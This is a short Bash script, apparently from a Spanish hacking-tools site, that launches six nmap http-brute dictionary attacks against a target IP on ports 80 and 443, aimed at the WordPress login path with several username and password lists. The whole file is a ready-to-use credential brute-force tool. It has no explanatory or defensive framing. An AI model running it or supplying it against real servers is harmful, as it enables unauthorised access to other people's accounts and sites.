#!/bin/bash
cat << "INFO"

                                                          ..
                               ,,,                         MM .M
                           ,!MMMMMMM!,                     MM MM  ,.
   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
 . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
 MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
  MMM      :M  'MMMMMMMMM brute http MMMMMMM'.MM  MM:M.    'MMMMM
 .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
AMMM..MMMMM:M.    :M.'hackingyseguridad.com'.MM'     MM''''''''''''
MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
            MMM.            'MMMM!MMMM'            .MM
             MMM.             '''   ''            .MM'
              MMM.                               MMM'
               MMMM            ,.J.JJJJ.       .MMM'
                MMMM.       'JJJJJJJ'JJJM   CMMMMM
                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
                      'MMMMMMMMM'JJJJJ JJJJJ'
                         ''MMMMMMJJJJJJJJJJ'
                                 'JJJJJJJJ'

INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a HTTP Auth Basic en puertos por defecto 80/TCP 443/tcp."
        echo "Requiere nmap"
        echo "Debemos especificar el path de la carpeta "
        echo "Uso.: sh brutehttp3.sh <ip>"
        echo
        exit 0
fi
echo
echo "hay que incluir en eñ script  argumentos como p.ej.: –script-args http-brute.path=/admin/ "
echo
nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?
nmap -Pn $1 -p 80,443 -sVC --script http-brute -script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0,http-brute.path=/wp-login.php?

